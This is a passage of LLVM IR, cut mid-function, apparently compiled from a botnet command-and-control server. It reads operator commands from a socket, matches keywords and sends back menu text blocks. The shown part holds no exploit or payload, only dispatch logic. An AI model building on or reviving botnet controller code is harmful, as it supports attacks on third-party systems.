  %275 = icmp eq i64 %274, -1
  br i1 %275, label %.loopexit.loopexit313, label %276

; <label>:276:                                    ; preds = %271
  %277 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  store i32 1, i32* %148, align 4
  %278 = call i32 @fdgets(i8* nonnull %96, i32 2048, i32 %93)
  %279 = icmp sgt i32 %278, 0
  br i1 %279, label %.lr.ph.preheader, label %.loopexit.loopexit313

.lr.ph.preheader:                                 ; preds = %276
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %280 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0)) #9
  %281 = icmp eq i8* %280, null
  br i1 %281, label %282, label %291

; <label>:282:                                    ; preds = %.lr.ph
  %283 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i64 0, i64 0)) #9
  %284 = icmp eq i8* %283, null
  br i1 %284, label %285, label %291

; <label>:285:                                    ; preds = %282
  %286 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #9
  %287 = icmp eq i8* %286, null
  br i1 %287, label %288, label %291

; <label>:288:                                    ; preds = %285
  %289 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i64 0, i64 0)) #9
  %290 = icmp eq i8* %289, null
  br i1 %290, label %297, label %291

; <label>:291:                                    ; preds = %288, %285, %282, %.lr.ph
  %292 = call i32 @clientsConnected()
  %293 = load volatile i32, i32* @managesConnected, align 4
  %294 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.34, i64 0, i64 0), i32 %292, i32 %293) #10
  %295 = call i64 @strlen(i8* nonnull %97) #9
  %296 = call i64 @send(i32 %93, i8* nonnull %97, i64 %295, i32 16384) #10
  br label %297

; <label>:297:                                    ; preds = %288, %291
  %298 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i64 0, i64 0)) #9
  %299 = icmp eq i8* %298, null
  br i1 %299, label %300, label %306

; <label>:300:                                    ; preds = %297
  %301 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0)) #9
  %302 = icmp eq i8* %301, null
  br i1 %302, label %303, label %306

; <label>:303:                                    ; preds = %300
  %304 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i64 0, i64 0)) #9
  %305 = icmp eq i8* %304, null
  br i1 %305, label %356, label %306

; <label>:306:                                    ; preds = %303, %300, %297
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %219, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i64 0, i64 0), i64 68, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %220, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %221, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.40, i64 0, i64 0), i64 52, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %222, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.41, i64 0, i64 0), i64 53, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %223, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.42, i64 0, i64 0), i64 52, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %224, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.43, i64 0, i64 0), i64 52, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %225, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.44, i64 0, i64 0), i64 52, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %226, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.45, i64 0, i64 0), i64 54, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %227, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.46, i64 0, i64 0), i64 53, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %228, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.47, i64 0, i64 0), i64 53, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %229, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %307 = call i64 @strlen(i8* nonnull %219) #9
  %308 = call i64 @send(i32 %93, i8* nonnull %219, i64 %307, i32 16384) #10
  %309 = icmp eq i64 %308, -1
  br i1 %309, label %.loopexit.loopexit, label %310

; <label>:310:                                    ; preds = %306
  %311 = call i64 @strlen(i8* nonnull %220) #9
  %312 = call i64 @send(i32 %93, i8* nonnull %220, i64 %311, i32 16384) #10
  %313 = icmp eq i64 %312, -1
  br i1 %313, label %.loopexit.loopexit, label %314

; <label>:314:                                    ; preds = %310
  %315 = call i64 @strlen(i8* nonnull %221) #9
  %316 = call i64 @send(i32 %93, i8* nonnull %221, i64 %315, i32 16384) #10
  %317 = icmp eq i64 %316, -1
  br i1 %317, label %.loopexit.loopexit, label %318

; <label>:318:                                    ; preds = %314
  %319 = call i64 @strlen(i8* nonnull %222) #9
  %320 = call i64 @send(i32 %93, i8* nonnull %222, i64 %319, i32 16384) #10
  %321 = icmp eq i64 %320, -1
  br i1 %321, label %.loopexit.loopexit, label %322

; <label>:322:                                    ; preds = %318
  %323 = call i64 @strlen(i8* nonnull %223) #9
  %324 = call i64 @send(i32 %93, i8* nonnull %223, i64 %323, i32 16384) #10
  %325 = icmp eq i64 %324, -1
  br i1 %325, label %.loopexit.loopexit, label %326

; <label>:326:                                    ; preds = %322
  %327 = call i64 @strlen(i8* nonnull %224) #9
  %328 = call i64 @send(i32 %93, i8* nonnull %224, i64 %327, i32 16384) #10
  %329 = icmp eq i64 %328, -1
  br i1 %329, label %.loopexit.loopexit, label %330

; <label>:330:                                    ; preds = %326
  %331 = call i64 @strlen(i8* nonnull %225) #9
  %332 = call i64 @send(i32 %93, i8* nonnull %225, i64 %331, i32 16384) #10
  %333 = icmp eq i64 %332, -1
  br i1 %333, label %.loopexit.loopexit, label %334

; <label>:334:                                    ; preds = %330
  %335 = call i64 @strlen(i8* nonnull %226) #9
  %336 = call i64 @send(i32 %93, i8* nonnull %226, i64 %335, i32 16384) #10
  %337 = icmp eq i64 %336, -1
  br i1 %337, label %.loopexit.loopexit, label %338

; <label>:338:                                    ; preds = %334
  %339 = call i64 @strlen(i8* nonnull %227) #9
  %340 = call i64 @send(i32 %93, i8* nonnull %227, i64 %339, i32 16384) #10
  %341 = icmp eq i64 %340, -1
  br i1 %341, label %.loopexit.loopexit, label %342

; <label>:342:                                    ; preds = %338
  %343 = call i64 @strlen(i8* nonnull %228) #9
  %344 = call i64 @send(i32 %93, i8* nonnull %228, i64 %343, i32 16384) #10
  %345 = icmp eq i64 %344, -1
  br i1 %345, label %.loopexit.loopexit, label %346

; <label>:346:                                    ; preds = %342
  %347 = call i64 @strlen(i8* nonnull %229) #9
  %348 = call i64 @send(i32 %93, i8* nonnull %229, i64 %347, i32 16384) #10
  %349 = icmp eq i64 %348, -1
  br i1 %349, label %.loopexit.loopexit, label %350

; <label>:350:                                    ; preds = %346
  %351 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %352 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %353 = call i64 @strlen(i8* nonnull %97) #9
  %354 = call i64 @send(i32 %93, i8* nonnull %97, i64 %353, i32 16384) #10
  %355 = icmp eq i64 %354, -1
  br i1 %355, label %.loopexit.loopexit, label %.backedge

; <label>:356:                                    ; preds = %303
  %357 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.48, i64 0, i64 0)) #9
  %358 = icmp eq i8* %357, null
  br i1 %358, label %359, label %368

; <label>:359:                                    ; preds = %356
  %360 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i64 0, i64 0)) #9
  %361 = icmp eq i8* %360, null
  br i1 %361, label %362, label %368

; <label>:362:                                    ; preds = %359
  %363 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i64 0, i64 0)) #9
  %364 = icmp eq i8* %363, null
  br i1 %364, label %365, label %368

; <label>:365:                                    ; preds = %362
  %366 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i64 0, i64 0)) #9
  %367 = icmp eq i8* %366, null
  br i1 %367, label %402, label %368

; <label>:368:                                    ; preds = %365, %362, %359, %356
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %212, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.52, i64 0, i64 0), i64 72, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %213, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %214, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.53, i64 0, i64 0), i64 58, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %215, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.54, i64 0, i64 0), i64 58, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %216, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.55, i64 0, i64 0), i64 60, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %217, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.56, i64 0, i64 0), i64 55, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %218, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %369 = call i64 @strlen(i8* nonnull %212) #9
  %370 = call i64 @send(i32 %93, i8* nonnull %212, i64 %369, i32 16384) #10
  %371 = icmp eq i64 %370, -1
  br i1 %371, label %.loopexit.loopexit, label %372

; <label>:372:                                    ; preds = %368
  %373 = call i64 @strlen(i8* nonnull %213) #9
  %374 = call i64 @send(i32 %93, i8* nonnull %213, i64 %373, i32 16384) #10
  %375 = icmp eq i64 %374, -1
  br i1 %375, label %.loopexit.loopexit, label %376

; <label>:376:                                    ; preds = %372
  %377 = call i64 @strlen(i8* nonnull %214) #9
  %378 = call i64 @send(i32 %93, i8* nonnull %214, i64 %377, i32 16384) #10
  %379 = icmp eq i64 %378, -1
  br i1 %379, label %.loopexit.loopexit, label %380

; <label>:380:                                    ; preds = %376
  %381 = call i64 @strlen(i8* nonnull %215) #9
  %382 = call i64 @send(i32 %93, i8* nonnull %215, i64 %381, i32 16384) #10
  %383 = icmp eq i64 %382, -1
  br i1 %383, label %.loopexit.loopexit, label %384

; <label>:384:                                    ; preds = %380
  %385 = call i64 @strlen(i8* nonnull %216) #9
  %386 = call i64 @send(i32 %93, i8* nonnull %216, i64 %385, i32 16384) #10
  %387 = icmp eq i64 %386, -1
  br i1 %387, label %.loopexit.loopexit, label %388

; <label>:388:                                    ; preds = %384
  %389 = call i64 @strlen(i8* nonnull %217) #9
  %390 = call i64 @send(i32 %93, i8* nonnull %217, i64 %389, i32 16384) #10
  %391 = icmp eq i64 %390, -1
  br i1 %391, label %.loopexit.loopexit, label %392

; <label>:392:                                    ; preds = %388
  %393 = call i64 @strlen(i8* nonnull %218) #9
  %394 = call i64 @send(i32 %93, i8* nonnull %218, i64 %393, i32 16384) #10
  %395 = icmp eq i64 %394, -1
  br i1 %395, label %.loopexit.loopexit, label %396

; <label>:396:                                    ; preds = %392
  %397 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %398 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %399 = call i64 @strlen(i8* nonnull %97) #9
  %400 = call i64 @send(i32 %93, i8* nonnull %97, i64 %399, i32 16384) #10
  %401 = icmp eq i64 %400, -1
  br i1 %401, label %.loopexit.loopexit, label %.backedge

; <label>:402:                                    ; preds = %365
  %403 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i64 0, i64 0)) #9
  %404 = icmp eq i8* %403, null
  br i1 %404, label %405, label %414

; <label>:405:                                    ; preds = %402
  %406 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0)) #9
  %407 = icmp eq i8* %406, null
  br i1 %407, label %408, label %414

; <label>:408:                                    ; preds = %405
  %409 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i64 0, i64 0)) #9
  %410 = icmp eq i8* %409, null
  br i1 %410, label %411, label %414

; <label>:411:                                    ; preds = %408
  %412 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i64 0, i64 0)) #9
  %413 = icmp eq i8* %412, null
  br i1 %413, label %453, label %414

; <label>:414:                                    ; preds = %411, %408, %405, %402
  %415 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %204, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.61, i64 0, i64 0), i64 76, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %205, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %206, i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str.62, i64 0, i64 0), i64 114, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %207, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.63, i64 0, i64 0), i64 107, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %208, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.64, i64 0, i64 0), i64 107, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %209, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.65, i64 0, i64 0), i64 107, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %210, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.66, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %211, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %416 = call i64 @strlen(i8* nonnull %204) #9
  %417 = call i64 @send(i32 %93, i8* nonnull %204, i64 %416, i32 16384) #10
  %418 = icmp eq i64 %417, -1
  br i1 %418, label %.loopexit.loopexit, label %419

; <label>:419:                                    ; preds = %414
  %420 = call i64 @strlen(i8* nonnull %205) #9
  %421 = call i64 @send(i32 %93, i8* nonnull %205, i64 %420, i32 16384) #10
  %422 = icmp eq i64 %421, -1
  br i1 %422, label %.loopexit.loopexit, label %423

; <label>:423:                                    ; preds = %419
  %424 = call i64 @strlen(i8* nonnull %206) #9
  %425 = call i64 @send(i32 %93, i8* nonnull %206, i64 %424, i32 16384) #10
  %426 = icmp eq i64 %425, -1
  br i1 %426, label %.loopexit.loopexit, label %427

; <label>:427:                                    ; preds = %423
  %428 = call i64 @strlen(i8* nonnull %207) #9
  %429 = call i64 @send(i32 %93, i8* nonnull %207, i64 %428, i32 16384) #10
  %430 = icmp eq i64 %429, -1
  br i1 %430, label %.loopexit.loopexit, label %431

; <label>:431:                                    ; preds = %427
  %432 = call i64 @strlen(i8* nonnull %208) #9
  %433 = call i64 @send(i32 %93, i8* nonnull %208, i64 %432, i32 16384) #10
  %434 = icmp eq i64 %433, -1
  br i1 %434, label %.loopexit.loopexit, label %435

; <label>:435:                                    ; preds = %431
  %436 = call i64 @strlen(i8* nonnull %209) #9
  %437 = call i64 @send(i32 %93, i8* nonnull %209, i64 %436, i32 16384) #10
  %438 = icmp eq i64 %437, -1
  br i1 %438, label %.loopexit.loopexit, label %439

; <label>:439:                                    ; preds = %435
  %440 = call i64 @strlen(i8* nonnull %210) #9
  %441 = call i64 @send(i32 %93, i8* nonnull %210, i64 %440, i32 16384) #10
  %442 = icmp eq i64 %441, -1
  br i1 %442, label %.loopexit.loopexit, label %443

; <label>:443:                                    ; preds = %439
  %444 = call i64 @strlen(i8* nonnull %211) #9
  %445 = call i64 @send(i32 %93, i8* nonnull %211, i64 %444, i32 16384) #10
  %446 = icmp eq i64 %445, -1
  br i1 %446, label %.loopexit.loopexit, label %447

; <label>:447:                                    ; preds = %443
  %448 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %449 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %450 = call i64 @strlen(i8* nonnull %97) #9
  %451 = call i64 @send(i32 %93, i8* nonnull %97, i64 %450, i32 16384) #10
  %452 = icmp eq i64 %451, -1
  br i1 %452, label %.loopexit.loopexit, label %.backedge

; <label>:453:                                    ; preds = %411
  %454 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #9
  %455 = icmp eq i8* %454, null
  br i1 %455, label %456, label %465

; <label>:456:                                    ; preds = %453
  %457 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i64 0, i64 0)) #9
  %458 = icmp eq i8* %457, null
  br i1 %458, label %459, label %465

; <label>:459:                                    ; preds = %456
  %460 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i64 0, i64 0)) #9
  %461 = icmp eq i8* %460, null
  br i1 %461, label %462, label %465

; <label>:462:                                    ; preds = %459
  %463 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #9
  %464 = icmp eq i8* %463, null
  br i1 %464, label %519, label %465

; <label>:465:                                    ; preds = %462, %459, %456, %453
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %192, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.71, i64 0, i64 0), i64 76, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %193, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %194, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.72, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %195, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.73, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %196, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.74, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %197, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.75, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %198, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.76, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %199, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.77, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %200, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.78, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %201, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.79, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %202, i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.80, i64 0, i64 0), i64 120, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %203, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %466 = call i64 @strlen(i8* nonnull %192) #9
  %467 = call i64 @send(i32 %93, i8* nonnull %192, i64 %466, i32 16384) #10
  %468 = icmp eq i64 %467, -1
  br i1 %468, label %.loopexit.loopexit, label %469

; <label>:469:                                    ; preds = %465
  %470 = call i64 @strlen(i8* nonnull %193) #9
  %471 = call i64 @send(i32 %93, i8* nonnull %193, i64 %470, i32 16384) #10
  %472 = icmp eq i64 %471, -1
  br i1 %472, label %.loopexit.loopexit, label %473

; <label>:473:                                    ; preds = %469
  %474 = call i64 @strlen(i8* nonnull %194) #9
  %475 = call i64 @send(i32 %93, i8* nonnull %194, i64 %474, i32 16384) #10
  %476 = icmp eq i64 %475, -1
  br i1 %476, label %.loopexit.loopexit, label %477

; <label>:477:                                    ; preds = %473
  %478 = call i64 @strlen(i8* nonnull %195) #9
  %479 = call i64 @send(i32 %93, i8* nonnull %195, i64 %478, i32 16384) #10
  %480 = icmp eq i64 %479, -1
  br i1 %480, label %.loopexit.loopexit, label %481

; <label>:481:                                    ; preds = %477
  %482 = call i64 @strlen(i8* nonnull %196) #9
  %483 = call i64 @send(i32 %93, i8* nonnull %196, i64 %482, i32 16384) #10
  %484 = icmp eq i64 %483, -1
  br i1 %484, label %.loopexit.loopexit, label %485

; <label>:485:                                    ; preds = %481
  %486 = call i64 @strlen(i8* nonnull %197) #9
  %487 = call i64 @send(i32 %93, i8* nonnull %197, i64 %486, i32 16384) #10
  %488 = icmp eq i64 %487, -1
  br i1 %488, label %.loopexit.loopexit, label %489

; <label>:489:                                    ; preds = %485
  %490 = call i64 @strlen(i8* nonnull %198) #9
  %491 = call i64 @send(i32 %93, i8* nonnull %198, i64 %490, i32 16384) #10
  %492 = icmp eq i64 %491, -1
  br i1 %492, label %.loopexit.loopexit, label %493

; <label>:493:                                    ; preds = %489
  %494 = call i64 @strlen(i8* nonnull %199) #9
  %495 = call i64 @send(i32 %93, i8* nonnull %199, i64 %494, i32 16384) #10
  %496 = icmp eq i64 %495, -1
  br i1 %496, label %.loopexit.loopexit, label %497

; <label>:497:                                    ; preds = %493
  %498 = call i64 @strlen(i8* nonnull %200) #9
  %499 = call i64 @send(i32 %93, i8* nonnull %200, i64 %498, i32 16384) #10
  %500 = icmp eq i64 %499, -1
  br i1 %500, label %.loopexit.loopexit, label %501

; <label>:501:                                    ; preds = %497
  %502 = call i64 @strlen(i8* nonnull %201) #9
  %503 = call i64 @send(i32 %93, i8* nonnull %201, i64 %502, i32 16384) #10
  %504 = icmp eq i64 %503, -1
  br i1 %504, label %.loopexit.loopexit, label %505

; <label>:505:                                    ; preds = %501
  %506 = call i64 @strlen(i8* nonnull %202) #9
  %507 = call i64 @send(i32 %93, i8* nonnull %202, i64 %506, i32 16384) #10
  %508 = icmp eq i64 %507, -1
  br i1 %508, label %.loopexit.loopexit, label %509

; <label>:509:                                    ; preds = %505
  %510 = call i64 @strlen(i8* nonnull %203) #9
  %511 = call i64 @send(i32 %93, i8* nonnull %203, i64 %510, i32 16384) #10
  %512 = icmp eq i64 %511, -1
  br i1 %512, label %.loopexit.loopexit, label %513

; <label>:513:                                    ; preds = %509
  %514 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %515 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %516 = call i64 @strlen(i8* nonnull %97) #9
  %517 = call i64 @send(i32 %93, i8* nonnull %97, i64 %516, i32 16384) #10
  %518 = icmp eq i64 %517, -1
  br i1 %518, label %.loopexit.loopexit, label %.backedge

; <label>:519:                                    ; preds = %462
  %520 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.81, i64 0, i64 0)) #9
  %521 = icmp eq i8* %520, null
  br i1 %521, label %522, label %534

; <label>:522:                                    ; preds = %519
  %523 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.82, i64 0, i64 0)) #9
  %524 = icmp eq i8* %523, null
  br i1 %524, label %525, label %534

; <label>:525:                                    ; preds = %522
  %526 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.83, i64 0, i64 0)) #9
  %527 = icmp eq i8* %526, null
  br i1 %527, label %528, label %534

; <label>:528:                                    ; preds = %525
  %529 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i64 0, i64 0)) #9
  %530 = icmp eq i8* %529, null
  br i1 %530, label %531, label %534

; <label>:531:                                    ; preds = %528
  %532 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i64 0, i64 0)) #9
  %533 = icmp eq i8* %532, null
  br i1 %533, label %561, label %534

; <label>:534:                                    ; preds = %531, %528, %525, %522, %519
  %535 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %187, i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.86, i64 0, i64 0), i64 79, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %188, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %189, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.87, i64 0, i64 0), i64 88, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %190, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.88, i64 0, i64 0), i64 88, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %191, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %536 = call i64 @strlen(i8* nonnull %187) #9
  %537 = call i64 @send(i32 %93, i8* nonnull %187, i64 %536, i32 16384) #10
  %538 = icmp eq i64 %537, -1
  br i1 %538, label %.loopexit.loopexit, label %539

; <label>:539:                                    ; preds = %534
  %540 = call i64 @strlen(i8* nonnull %188) #9
  %541 = call i64 @send(i32 %93, i8* nonnull %188, i64 %540, i32 16384) #10
  %542 = icmp eq i64 %541, -1
  br i1 %542, label %.loopexit.loopexit, label %543

; <label>:543:                                    ; preds = %539
  %544 = call i64 @strlen(i8* nonnull %189) #9
  %545 = call i64 @send(i32 %93, i8* nonnull %189, i64 %544, i32 16384) #10
  %546 = icmp eq i64 %545, -1
  br i1 %546, label %.loopexit.loopexit, label %547

; <label>:547:                                    ; preds = %543
  %548 = call i64 @strlen(i8* nonnull %190) #9
  %549 = call i64 @send(i32 %93, i8* nonnull %190, i64 %548, i32 16384) #10
  %550 = icmp eq i64 %549, -1
  br i1 %550, label %.loopexit.loopexit, label %551

; <label>:551:                                    ; preds = %547
  %552 = call i64 @strlen(i8* nonnull %191) #9
  %553 = call i64 @send(i32 %93, i8* nonnull %191, i64 %552, i32 16384) #10
  %554 = icmp eq i64 %553, -1
  br i1 %554, label %.loopexit.loopexit, label %555

; <label>:555:                                    ; preds = %551
  %556 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %557 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %558 = call i64 @strlen(i8* nonnull %97) #9
  %559 = call i64 @send(i32 %93, i8* nonnull %97, i64 %558, i32 16384) #10
